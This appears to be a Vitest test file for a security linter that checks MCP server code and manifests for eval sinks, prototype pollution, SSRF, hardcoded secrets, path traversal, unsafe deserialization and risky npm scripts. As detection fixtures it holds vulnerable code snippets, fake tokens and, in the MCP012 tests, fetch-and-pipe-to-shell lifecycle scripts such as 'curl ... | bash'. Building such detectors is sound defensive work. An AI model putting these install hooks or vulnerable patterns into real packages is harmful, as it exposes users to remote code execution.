/**
 * rules-deep.test.js -- TDD coverage for the deeper rule set MCP007-MCP014.
 *
 * Every rule gets the three-way contract the project holds itself to:
 *   - a VULNERABLE case fires with the correct severity + location,
 *   - a BORDERLINE / safe case that LOOKS similar does NOT fire (cry-wolf
 *     is the failure mode for a security linter),
 *   - the relevant pure entrypoint is used directly (no network, no key).
 */
import { describe, it, expect } from "vitest";
import { analyzeSource, analyzeManifest } from "../src/rules.js";

const byRule = (fs, id) => fs.filter((f) => f.ruleId === id);
const sev = (fs, id) => byRule(fs, id)[0]?.severity;

describe("MCP005 dangerous-eval -- member-call false-positive guard", () => {
  // Regression for the adversarial-review FP: `/\beval\s*\(/` etc. had NO
  // qualifier guard (unlike MCP001/MCP010 provenance). A `.eval(`/`.compile(`
  // METHOD on some object (math lib, parser, ORM) is legitimate code and must
  // NOT fire. Only a BARE global eval(, new Function(, or a genuine vm.* on a
  // provenance-confirmed `vm` builtin should fire.
  it("does NOT fire on a mathjs compile()/eval() method chain", () => {
    const code = [
      "import { create, all } from 'mathjs';",
      "const math = create(all);",
      "const node = math.compile(formula);",
      "const out = node.eval({ x: 2 });",
    ].join("\n");
    expect(byRule(analyzeSource(code, "mj.js"), "MCP005")).toHaveLength(0);
  });

  it("does NOT fire on someParser.eval(expr) (member call, no vm/global)", () => {
    const code = "const r = someParser.eval(expr);";
    expect(byRule(analyzeSource(code, "pe.js"), "MCP005")).toHaveLength(0);
  });

  it("does NOT fire on obj.compile(x) where obj is not the vm builtin", () => {
    const code =
      "import handlebars from 'handlebars';\nconst tpl = handlebars.compile(src);";
    expect(byRule(analyzeSource(code, "hb.js"), "MCP005")).toHaveLength(0);
  });

  it("does NOT fire on optional-chained schema?.compile(x)", () => {
    const code = "const c = schema?.compile(userShape);";
    expect(byRule(analyzeSource(code, "oc.js"), "MCP005")).toHaveLength(0);
  });

  it("STILL fires on a bare global eval(userInput) (true positive intact)", () => {
    const code = "function f(expr){ return eval(expr); }";
    const f = byRule(analyzeSource(code, "tp.js"), "MCP005");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("high");
    expect(f[0].line).toBe(1);
  });

  it("STILL fires on new Function(body) and vm.runInThisContext(src)", () => {
    const code = "new Function(body);\nvm.runInThisContext(src);";
    expect(byRule(analyzeSource(code, "tp2.js"), "MCP005")).toHaveLength(2);
  });

  it("STILL fires on vm.compileFunction(src) (genuine vm builtin)", () => {
    // `vm` is a recognised Node builtin namespace -- the qualifier guard must
    // NOT suppress real vm code execution just because it has a `.` before it.
    const code =
      "import vm from 'node:vm';\nvm.compileFunction(attackerSrc);";
    const f = byRule(analyzeSource(code, "tp3.js"), "MCP005");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("high");
  });

  it("does NOT fire on a userland `vm` that is not the node builtin", () => {
    // Conservative: if `vm` is never imported as the node:vm builtin, a
    // `vm.runInThisContext(`-shaped call on some other `vm` object is more
    // likely a false positive than a real sink. Favor a false negative.
    const code =
      "const vm = makeSandboxShim();\nvm.runInThisContext(expr);";
    expect(byRule(analyzeSource(code, "uv.js"), "MCP005")).toHaveLength(0);
  });
});

describe("MCP007 prototype pollution", () => {
  it("fires on _.merge(target, nonLiteralSource)", () => {
    const code = [
      "import _ from 'lodash';",
      "function apply(obj, patch) {",
      "  _.merge(obj, patch);",
      "}",
    ].join("\n");
    const f = byRule(analyzeSource(code, "p.js"), "MCP007");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("high");
    expect(f[0].line).toBe(3);
  });

  it("fires on a computed assignment with a proto token on the line", () => {
    const code = "function set(o,k,v){ o['__proto__'][k] = v; }";
    expect(byRule(analyzeSource(code, "p2.js"), "MCP007").length).toBeGreaterThanOrEqual(1);
  });

  it("does NOT fire on merge with an INLINE OBJECT LITERAL source", () => {
    const code =
      "import _ from 'lodash';\n_.merge(cfg, { retries: 3, timeout: 1000 });";
    expect(byRule(analyzeSource(code, "ok.js"), "MCP007")).toHaveLength(0);
  });

  it("does NOT fire on a numeric array index assignment", () => {
    const code = "const a=[]; for(let i=0;i<3;i++){ a[i]=i*2; }";
    expect(byRule(analyzeSource(code, "ok2.js"), "MCP007")).toHaveLength(0);
  });

  it("does NOT fire on Object.assign with a literal default", () => {
    const code = "const m = Object.assign({}, { a: 1 }, opts);";
    // Object.assign is shallow and not in the recursive-merge sink list.
    expect(byRule(analyzeSource(code, "ok3.js"), "MCP007")).toHaveLength(0);
  });

  // -- the `constructor` gate, found scanning ooples/token-optimizer-mcp ------
  // `\bconstructor\b` as a file-level "does this code touch the proto chain"
  // signal is satisfied by the class constructor that every OO file declares.
  // It gated nothing, and it was the ONLY reason the corpus's one true
  // positive fired. Evidence must now be a real proto reference or a key
  // visibly rooted at tool input.

  it("fires HIGH when the key is rooted at tool input, with no proto token", () => {
    const code = [
      "class Server {",
      "  constructor() { this.branches = {}; }",
      "  process(input) { this.branches[input.branchId] = []; }",
      "}",
    ].join("\n");
    const f = byRule(analyzeSource(code, "tp.ts"), "MCP007");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("high");
    expect(f[0].line).toBe(3);
  });

  it("does NOT fire when a class constructor is the only proto token", () => {
    const code = [
      "class Counter {",
      "  constructor() { this.byLevel = {}; }",
      "  tally(entry) { this.byLevel[entry.level] = 1; }",
      "}",
    ].join("\n");
    expect(byRule(analyzeSource(code, "ctor.ts"), "MCP007")).toHaveLength(0);
  });

  it("downgrades to MEDIUM when the file is proto-aware but the key is opaque", () => {
    const code = [
      "const BAD = '__proto__';",
      "function copy(dst, src, k) { dst[k] = src[k]; }",
    ].join("\n");
    const f = byRule(analyzeSource(code, "med.ts"), "MCP007");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("medium");
  });

  it("does NOT fire on a for-counter index into a numeric array", () => {
    const code = [
      "class Embed {",
      "  constructor() {}",
      "  build(n, hash) {",
      "    const embedding = [];",
      "    for (let i = 0; i < n; i++) { embedding[i] = hash[i] / 127.5 - 1; }",
      "    return embedding;",
      "  }",
      "}",
    ].join("\n");
    expect(byRule(analyzeSource(code, "num.ts"), "MCP007")).toHaveLength(0);
  });

  it("does NOT fire on a Levenshtein matrix write", () => {
    const code = [
      "class D {",
      "  constructor() {}",
      "  dist(a, b) {",
      "    const matrix = [];",
      "    for (let i = 1; i <= a; i++) {",
      "      for (let j = 1; j <= b; j++) { matrix[i][j] = matrix[i - 1][j] + 1; }",
      "    }",
      "  }",
      "}",
    ].join("\n");
    expect(byRule(analyzeSource(code, "lev.ts"), "MCP007")).toHaveLength(0);
  });

  // -- a declaration is not a call -------------------------------------------

  it("does NOT fire on a `set` METHOD DECLARATION with typed parameters", () => {
    const code = [
      "class LRU {",
      "  public set(key: K, value: V, ttlMs?: number): void {",
      "    this.cache.set(key, value);",
      "  }",
      "}",
    ].join("\n");
    expect(byRule(analyzeSource(code, "lru.ts"), "MCP007")).toHaveLength(0);
  });

  it("does NOT fire on a multi-line `set(` declaration", () => {
    const code = [
      "class Engine {",
      "  set(",
      "    key: string,",
      "    value: string,",
      "    size: number",
      "  ): void {",
      "    this.store[key] = value;",
      "  }",
      "}",
    ].join("\n");
    const f = byRule(analyzeSource(code, "eng.ts"), "MCP007");
    // The declaration itself must not fire; `this.store[key] = value` has no
    // proto evidence and no external root either, so the file is silent.
    expect(f).toHaveLength(0);
  });

  it("still fires on a genuine bare lodash-style set(obj, path, value)", () => {
    const code = "import { set } from 'lodash';\nfunction f(o, p, v) { set(o, p, v); }";
    const f = byRule(analyzeSource(code, "ls.js"), "MCP007");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("high");
  });

  // -- receiver capture across a TS non-null assertion ------------------------

  // -- the guard must not be read as the danger, found scanning freee-mcp -----

  it("downgrades to LOW behind Object.hasOwn(obj, key)", () => {
    const code = [
      "async function add(config, companyId) {",
      "  if (!Object.hasOwn(config.companies, companyId)) {",
      "    config.companies[companyId] = { id: companyId };",
      "  }",
      "}",
      "const RESERVED = new Set(['__proto__', 'constructor', 'prototype']);",
    ].join("\n");
    const f = byRule(analyzeSource(code, "hasown.ts"), "MCP007");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("low");
  });

  it("downgrades to LOW behind a same-file validator that rejects proto keys", () => {
    // The validator sits outside the 25-line lookback, as it does in the real
    // freee-mcp file -- so the direct `RESERVED_KEYS.has(...)` branch cannot
    // see it and the finding rests entirely on reading the validator's body.
    const code = [
      "const RESERVED_KEYS = new Set(['__proto__', 'constructor', 'prototype']);",
      "function assertSafeCompanyId(companyId) {",
      "  if (RESERVED_KEYS.has(companyId)) throw new Error('bad id');",
      "}",
      ...Array(30).fill("// filler"),
      "function add(config, companyId) {",
      "  assertSafeCompanyId(companyId);",
      "  config.companies[companyId] = { id: companyId };",
      "}",
    ].join("\n");
    const f = byRule(analyzeSource(code, "validator.ts"), "MCP007");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("low");
    expect(f[0].message).toMatch(/assertSafeCompanyId/);
  });

  it("does NOT downgrade for a same-name call whose body never mentions proto", () => {
    const code = [
      "const BAD = '__proto__';",
      "function trim(k) { return k.trim(); }",
      "function add(o, k, v) { trim(k); o[k] = v; }",
    ].join("\n");
    const f = byRule(analyzeSource(code, "nodowngrade.ts"), "MCP007");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).not.toBe("low");
  });

  // -- a string-literal union type is a closed set, found in mongodb-mcp-server

  it("does NOT fire when the key's TS type is a union of string literals", () => {
    const code = [
      "class ToolBase {",
      "  release() { const ctor = this.constructor; return ctor; }",
      '  private redirect(property: "argsShape" | "outputSchema", shape: Shape): void {',
      "    this[property] = shape;",
      "  }",
      "}",
    ].join("\n");
    expect(byRule(analyzeSource(code, "union.ts"), "MCP007")).toHaveLength(0);
  });

  it("STILL fires when a literal union actually contains a proto key", () => {
    const code = [
      "class Evil {",
      "  release() { const ctor = this.constructor; return ctor; }",
      '  set(property: "argsShape" | "__proto__", shape: Shape): void {',
      "    this[property] = shape;",
      "  }",
      "}",
    ].join("\n");
    expect(
      byRule(analyzeSource(code, "evil.ts"), "MCP007").length,
    ).toBeGreaterThanOrEqual(1);
  });

  it("does NOT fire on Map.set reached through a `!` non-null assertion", () => {
    const code = [
      "class P {",
      "  constructor() { this.m = new Map(); }",
      "  link(k, other, sim) { this.m.get(k)!.set(other, sim); }",
      "}",
    ].join("\n");
    expect(byRule(analyzeSource(code, "map.ts"), "MCP007")).toHaveLength(0);
  });
});

describe("MCP008 SSRF-able fetch", () => {
  it("fires on fetch(barerVariableUrl)", () => {
    const code = "async function f(url){ return fetch(url); }";
    const f = byRule(analyzeSource(code, "s.js"), "MCP008");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("high");
  });

  it("fires on a template where the HOST is interpolated", () => {
    const code = "fetch(`https://${host}/api`);";
    expect(byRule(analyzeSource(code, "s2.js"), "MCP008")).toHaveLength(1);
  });

  it("fires on `${base}/path` (origin is a variable)", () => {
    const code = "fetch(`${base}/v1/data`);";
    expect(byRule(analyzeSource(code, "s3.js"), "MCP008")).toHaveLength(1);
  });

  it("does NOT fire when the origin is a fixed literal and only path varies (concat)", () => {
    const code =
      'fetch("https://api.example.test/v1/x?q=" + encodeURIComponent(q));';
    expect(byRule(analyzeSource(code, "ok.js"), "MCP008")).toHaveLength(0);
  });

  it("does NOT fire on a fixed-origin template with an interpolated path", () => {
    const code = "fetch(`https://api.example.test/v1/by/${id}`);";
    expect(byRule(analyzeSource(code, "ok2.js"), "MCP008")).toHaveLength(0);
  });

  it("does NOT fire on a fully literal URL", () => {
    const code = 'fetch("https://api.example.test/health");';
    expect(byRule(analyzeSource(code, "ok3.js"), "MCP008")).toHaveLength(0);
  });

  it("does NOT fire on new URL(path, FIXED_LITERAL_BASE)", () => {
    const code = 'fetch(new URL(p, "https://api.example.test"));';
    expect(byRule(analyzeSource(code, "ok4.js"), "MCP008")).toHaveLength(0);
  });

  it("does NOT fire when the sink is only inside a comment", () => {
    const code = "// fetch(userControlledUrl) would be SSRF\nconst x=1;";
    expect(byRule(analyzeSource(code, "ok5.js"), "MCP008")).toHaveLength(0);
  });
});

describe("MCP009 hardcoded secret", () => {
  it("fires on a GitHub token in a string literal", () => {
    const code =
      'const t = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab";';
    const f = byRule(analyzeSource(code, "k.js"), "MCP009");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("critical");
  });

  it("fires on a private key PEM header even with the word example nearby", () => {
    const code =
      'const k = "-----BEGIN RSA PRIVATE KEY-----\\nexamplexample";';
    expect(byRule(analyzeSource(code, "k2.js"), "MCP009")).toHaveLength(1);
  });

  it("fires on an Anthropic-style key (never OpenAI-only assumptions)", () => {
    const code = 'const a = "sk-ant-api03-AAAABBBBCCCCDDDDEEEEFFFF1234";';
    expect(byRule(analyzeSource(code, "k3.js"), "MCP009")).toHaveLength(1);
  });

  it("does NOT fire on an obvious placeholder", () => {
    const code = 'const t = "ghp_your-token-here-XXXXXXXXXXXXXXXXXXXXXXXX";';
    expect(byRule(analyzeSource(code, "ok.js"), "MCP009")).toHaveLength(0);
  });

  it("does NOT fire on a token only mentioned in a comment", () => {
    const code = "// example: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ab\nlet x;";
    expect(byRule(analyzeSource(code, "ok2.js"), "MCP009")).toHaveLength(0);
  });
});

describe("MCP010 path traversal", () => {
  it("fires on fs.readFileSync('./data/' + name)", () => {
    const code =
      "import fs from 'node:fs';\nfs.readFileSync('./data/' + name, 'utf8');";
    const f = byRule(analyzeSource(code, "t.js"), "MCP010");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("high");
    expect(f[0].line).toBe(2);
  });

  it("fires on a bare-variable path with fs provenance", () => {
    const code = "import fs from 'fs';\nfs.createReadStream(userPath);";
    expect(byRule(analyzeSource(code, "t2.js"), "MCP010")).toHaveLength(1);
  });

  it("does NOT fire when the path is reduced via path.basename", () => {
    const code =
      "import fs from 'node:fs';\nimport path from 'node:path';\nconst s=path.basename(n);\nfs.readFileSync(path.join('./docs', s));";
    expect(byRule(analyzeSource(code, "ok.js"), "MCP010")).toHaveLength(0);
  });

  it("does NOT fire on path.join('./dir', x) (standard containment idiom)", () => {
    const code =
      "import fs from 'node:fs';\nimport path from 'node:path';\nfs.readFileSync(path.join('./dir', x));";
    expect(byRule(analyzeSource(code, "ok2.js"), "MCP010")).toHaveLength(0);
  });

  it("does NOT fire on a pure literal path", () => {
    const code = "import fs from 'node:fs';\nfs.readFileSync('./config.json');";
    expect(byRule(analyzeSource(code, "ok3.js"), "MCP010")).toHaveLength(0);
  });

  it("does NOT fire on a bare readFile() with no fs import (provenance)", () => {
    const code = "readFile(somePath);";
    expect(byRule(analyzeSource(code, "ok4.js"), "MCP010")).toHaveLength(0);
  });

  // Regression for the adversarial-review FP: extract-to-named-variable is
  // idiomatic SAFE code. The rule only inspected containment idioms INSIDE the
  // fs-call's first arg, so a containment-bearing variable assigned EARLIER
  // (hoisted) falsely fired. A backward look at the assignment must treat it
  // as contained.
  it("does NOT fire on hoisted const safe = path.resolve(BASE, path.basename(x))", () => {
    const code = [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "const BASE = './docs';",
      "const safe = path.resolve(BASE, path.basename(name));",
      "fs.readFileSync(safe);",
    ].join("\n");
    expect(byRule(analyzeSource(code, "hoist.js"), "MCP010")).toHaveLength(0);
  });

  it("does NOT fire on hoisted const p = path.join(BASE, path.basename(n)) (let/var too)", () => {
    const code = [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "let p = path.join('./data', path.basename(req.params.n));",
      "fs.createReadStream(p);",
    ].join("\n");
    expect(byRule(analyzeSource(code, "hoist2.js"), "MCP010")).toHaveLength(0);
  });

  it("does NOT fire on hoisted const clean = path.normalize(raw)", () => {
    const code = [
      "import fs from 'node:fs';",
      "import path from 'node:path';",
      "const clean = path.normalize(raw);",
      "fs.writeFileSync(clean, data);",
    ].join("\n");
    expect(byRule(analyzeSource(code, "hoist3.js"), "MCP010")).toHaveLength(0);
  });

  it("STILL fires on a hoisted variable assigned from raw tool input (no containment)", () => {
    // The hoist guard must NOT over-suppress: a bare-ident path whose
    // assignment has NO path.* containment is still the real traversal sink.
    const code = [
      "import fs from 'node:fs';",
      "const target = req.query.path;",
      "fs.readFileSync(target);",
    ].join("\n");
    const f = byRule(analyzeSource(code, "hoistbad.js"), "MCP010");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("high");
    expect(f[0].line).toBe(3);
  });

  it("STILL fires on a direct uncontained fs path (true positive intact)", () => {
    const code =
      "import fs from 'node:fs';\nfs.readFileSync(req.query.path);";
    const f = byRule(analyzeSource(code, "tpfs.js"), "MCP010");
    expect(f).toHaveLength(1);
    expect(f[0].line).toBe(2);
  });
});

describe("MCP011 unsafe deserialization", () => {
  it("fires (critical) on node-serialize unserialize(nonLiteral)", () => {
    const code =
      "import { unserialize } from 'node-serialize';\nconst o = unserialize(payload);";
    const f = byRule(analyzeSource(code, "d.js"), "MCP011");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("critical");
  });

  it("fires (high) on yaml.load(nonLiteral) with the default schema", () => {
    const code = "import yaml from 'js-yaml';\nconst d = yaml.load(input);";
    const f = byRule(analyzeSource(code, "d2.js"), "MCP011");
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("high");
  });

  it("does NOT fire on yaml.load(x, { schema: yaml.JSON_SCHEMA })", () => {
    const code =
      "import yaml from 'js-yaml';\nyaml.load(input, { schema: yaml.JSON_SCHEMA });";
    expect(byRule(analyzeSource(code, "ok.js"), "MCP011")).toHaveLength(0);
  });

  it("does NOT fire on JSON.parse (data only)", () => {
    const code = "const o = JSON.parse(body);";
    expect(byRule(analyzeSource(code, "ok2.js"), "MCP011")).toHaveLength(0);
  });

  it("does NOT fire on a literal payload", () => {
    const code =
      "import { unserialize } from 'node-serialize';\nunserialize('{\"a\":1}');";
    expect(byRule(analyzeSource(code, "ok3.js"), "MCP011")).toHaveLength(0);
  });
});

describe("MCP012 dangerous npm lifecycle script", () => {
  it("fires (critical) on a postinstall curl|bash", () => {
    const f = byRule(
      analyzeManifest(
        {
          name: "x",
          scripts: { postinstall: "curl -fsSL https://x.test/i.sh | bash" },
        },
        "package.json",
      ),
      "MCP012",
    );
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("critical");
  });

  it("fires on a base64-decode-pipe-to-shell preinstall", () => {
    const f = byRule(
      analyzeManifest(
        { scripts: { preinstall: "echo Zm9v | base64 -d | sh" } },
        "package.json",
      ),
      "MCP012",
    );
    expect(f.length).toBeGreaterThanOrEqual(1);
  });

  it("does NOT fire on a normal build postinstall", () => {
    expect(
      byRule(
        analyzeManifest(
          { scripts: { postinstall: "node ./scripts/build.js", prepare: "husky install" } },
          "package.json",
        ),
        "MCP012",
      ),
    ).toHaveLength(0);
  });

  it("does NOT fire on a non-lifecycle script that curls", () => {
    // `scripts.deploy` is not an auto-run lifecycle hook.
    expect(
      byRule(
        analyzeManifest(
          { scripts: { deploy: "curl https://x | bash" } },
          "package.json",
        ),
        "MCP012",
      ),
    ).toHaveLength(0);
  });
});

describe("MCP013 secret committed in a manifest", () => {
  it("fires on a token in an env block", () => {
    const f = byRule(
      analyzeManifest(
        { env: { GITHUB_TOKEN: "ghp_REALLOOKINGTOKEN0123456789abcdefABCDEF12" } },
        "mcp.json",
      ),
      "MCP013",
    );
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("critical");
  });

  it("does NOT fire when the env value is a placeholder", () => {
    expect(
      byRule(
        analyzeManifest(
          { env: { GITHUB_TOKEN: "ghp_your_token_here_XXXXXXXXXXXXXXXXXX" } },
          "mcp.json",
        ),
        "MCP013",
      ),
    ).toHaveLength(0);
  });

  it("does NOT fire when the manifest only references a var NAME", () => {
    expect(
      byRule(
        analyzeManifest(
          { env: { GITHUB_TOKEN: "${GITHUB_TOKEN}" } },
          "mcp.json",
        ),
        "MCP013",
      ),
    ).toHaveLength(0);
  });
});

describe("MCP014 risky declared dependency (static, no registry)", () => {
  it("fires (medium) on a git+ dependency source", () => {
    const f = byRule(
      analyzeManifest(
        {
          name: "x",
          dependencies: { foo: "git+https://github.com/a/foo.git" },
        },
        "package.json",
      ),
      "MCP014",
    );
    expect(f).toHaveLength(1);
    expect(f[0].severity).toBe("medium");
  });

  it("fires (low, advisory) on a one-char typosquat of a known package", () => {
    const f = byRule(
      analyzeManifest(
        { name: "x", dependencies: { expres: "1.0.0" } },
        "package.json",
      ),
      "MCP014",
    );
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f.some((x) => x.severity === "low")).toBe(true);
    // It must be framed as advisory, NOT a malware/CVE assertion.
    expect(f.find((x) => x.severity === "low").message).toMatch(
      /advisory|confusable|no registry/i,
    );
  });

  it("does NOT fire on an exact registry version of a known-good package", () => {
    expect(
      byRule(
        analyzeManifest(
          {
            name: "x",
            dependencies: { zod: "3.23.8", "js-yaml": "4.1.0", lodash: "4.17.21" },
          },
          "package.json",
        ),
        "MCP014",
      ),
    ).toHaveLength(0);
  });

  it("makes NO CVE/version-vuln claim (no bundled vuln DB)", () => {
    const all = analyzeManifest(
      { name: "x", dependencies: { lodash: "4.17.4" } },
      "package.json",
    );
    // An old lodash is a known-CVE version, but we deliberately do NOT
    // assert that (no offline vuln DB) -- so MCP014 must stay silent here.
    expect(byRule(all, "MCP014")).toHaveLength(0);
  });
});

describe("manifest rules are shape-aware (no cross-manifest double-fire)", () => {
  it("a package.json-only rule does not fire on an mcp.json shape", () => {
    // mcp.json has `command`, no `scripts`/`dependencies`.
    const f = analyzeManifest(
      { name: "s", command: "node", args: ["i.js"] },
      "mcp.json",
    );
    expect(byRule(f, "MCP012")).toHaveLength(0);
    expect(byRule(f, "MCP014")).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// MCP009 -- a key the code itself says is public.
// Found scanning ChromeDevTools/chrome-devtools-mcp, which bluesky-social and
// others install. The key below is a SYNTHETIC 39-char value with the right
// shape; never put a real credential in a test fixture.
// ---------------------------------------------------------------------------
const FAKE_GOOGLE_KEY = "AIzaSyA1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q";

describe("MCP009 hardcoded secret", () => {
  it("downgrades when a comment directly above declares the key public", () => {
    const code = [
      "async function crux() {",
      "  // go/jtfbx. Yes, we're aware this API key is public. ;)",
      "  setEndpoint(",
      `    'https://chromeuxreport.googleapis.com/v1/records?key=${FAKE_GOOGLE_KEY}',`,
      "  );",
      "}",
    ].join("\n");
    const f = byRule(analyzeSource(code, "crux.ts"), "MCP009");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("low");
    expect(f[0].message).toMatch(/restricted by referrer/);
  });

  it("STILL reports CRITICAL without such a comment", () => {
    const code = [
      "async function crux() {",
      "  // fetch field data",
      "  setEndpoint(",
      `    'https://chromeuxreport.googleapis.com/v1/records?key=${FAKE_GOOGLE_KEY}',`,
      "  );",
      "}",
    ].join("\n");
    const f = byRule(analyzeSource(code, "crux2.ts"), "MCP009");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("critical");
  });

  it("NEVER downgrades a PRIVATE KEY, whatever the comment claims", () => {
    const code = [
      "// this key is public, honest",
      "const k = `-----BEGIN RSA PRIVATE KEY-----`;",
    ].join("\n");
    const f = byRule(analyzeSource(code, "pk.ts"), "MCP009");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("critical");
  });

  it("does not treat an unrelated nearby comment as an assertion", () => {
    const code = [
      "// the public API is documented at example.com",
      `const k = '${FAKE_GOOGLE_KEY}';`,
    ].join("\n");
    const f = byRule(analyzeSource(code, "unrel.ts"), "MCP009");
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0].severity).toBe("critical");
  });
});
